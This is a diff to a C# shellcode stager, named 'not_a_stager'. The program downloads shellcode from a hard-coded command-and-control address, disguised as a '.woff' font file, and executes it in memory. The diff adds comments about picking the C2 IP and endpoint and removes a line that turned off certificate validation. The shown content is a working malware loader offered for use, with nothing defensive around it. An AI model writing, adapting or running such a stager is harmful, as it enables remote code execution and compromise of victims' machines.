@@ -13,6 +13,7 @@ namespace not_a_stager
     {
         public static void Main(String[] args)
         {
+            // specify IP of C2 and a .woff endpoint (can be anything)
             byte[] shellcode = Download("http://192.168.3.153/inconspicuous.woff");
             Execute(shellcode);
 
@@ -21,8 +22,6 @@ namespace not_a_stager
 
         private static byte[] Download(string url)
         {
-            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
-
             //Download shellcode
             System.Net.WebClient client = new System.Net.WebClient();
             byte[] shellcode = client.DownloadData(url);
@@ -54,6 +53,7 @@ namespace not_a_stager
             }
             catch (Exception ex)
             {
+                // For troubleshooty
                 Console.WriteLine("Bruh: " + ex.Message);
             }
         }
